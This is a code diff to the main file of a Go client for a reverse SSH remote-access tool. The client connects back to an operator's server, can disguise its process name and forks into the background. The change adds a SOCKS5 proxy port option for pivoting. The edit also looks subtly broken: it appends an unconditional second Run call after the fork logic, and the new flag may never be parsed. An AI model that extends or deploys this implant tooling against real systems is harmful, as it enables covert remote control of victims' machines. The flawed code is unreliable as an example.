@@ -1,6 +1,7 @@
 package main
 
 import (
+	"flag"
 	"fmt"
 	"io"
 	"log"
@@ -15,6 +16,20 @@ import (
 	"github.com/NHAS/reverse_ssh/internal/client"
 	"github.com/NHAS/reverse_ssh/internal/terminal"
 	"github.com/NHAS/reverse_ssh/pkg/logger"
+)
+
+var (
+	destination string
+	fingerprint string
+	proxy       string
+	ignoreInput string
+	customSNI   string
+	useKerberos bool
+	// golang can only embed strings using the compile time linker
+	useKerberosStr string
+	logLevel       string
+	ntlmProxyCreds string
+	socksFlag      = flag.Int("socks", 0, "Start SOCKS5 proxy server on specified port")
 )
 
 func fork(path string, sysProcAttr *syscall.SysProcAttr, pretendArgv ...string) error {
@@ -35,19 +50,6 @@ func fork(path string, sysProcAttr *syscall.SysProcAttr, pretendArgv ...string) 
 	return err
 }
 
-var (
-	destination string
-	fingerprint string
-	proxy       string
-	ignoreInput string
-	customSNI   string
-	useKerberos bool
-	// golang can only embed strings using the compile time linker
-	useKerberosStr string
-	logLevel       string
-	ntlmProxyCreds string
-)
-
 func printHelp() {
 	fmt.Println("usage: ", filepath.Base(os.Args[0]), "--[foreground|fingerprint|proxy|process_name] -d|--destination <server_address>")
 	fmt.Println("\t\t-d or --destination\tServer connect back address (can be baked in)")
@@ -67,7 +69,7 @@ func main() {
 	useKerberos = useKerberosStr == "true"
 
 	if len(os.Args) == 0 || ignoreInput == "true" {
-		Run(destination, fingerprint, proxy, customSNI, useKerberos)
+		Run(destination, fingerprint, proxy, customSNI, useKerberos, 0)
 		return
 	}
 
@@ -171,21 +173,34 @@ func main() {
 		return
 	}
 
+	// After parsing flags, prioritize command line flag over environment variable
+	socksPort := *socksFlag
+	if socksPort == 0 {
+		if portStr, ok := os.LookupEnv("SOCKS_PORT"); ok {
+			socksPort, _ = strconv.Atoi(portStr)
+		}
+	}
+
+	if socksPort > 0 {
+		log.Printf("SOCKS5 proxy will be started on port %d", socksPort)
+	}
+
 	if fg || child {
-		Run(destination, fingerprint, proxy, customSNI, useKerberos)
+		Run(destination, fingerprint, proxy, customSNI, useKerberos, socksPort)
 		return
 	}
 
 	if strings.HasPrefix(destination, "stdio://") {
 		// We cant fork off of an inetd style connection or stdin/out will be closed
 		log.SetOutput(io.Discard)
-		Run(destination, fingerprint, proxy, customSNI, useKerberos)
+		Run(destination, fingerprint, proxy, customSNI, useKerberos, socksPort)
 		return
 	}
 
 	err = Fork(destination, fingerprint, proxy, customSNI, useKerberos, processArgv...)
 	if err != nil {
-		Run(destination, fingerprint, proxy, customSNI, useKerberos)
+		Run(destination, fingerprint, proxy, customSNI, useKerberos, socksPort)
 	}
 
+	Run(destination, fingerprint, proxy, customSNI, useKerberos, socksPort)
 }
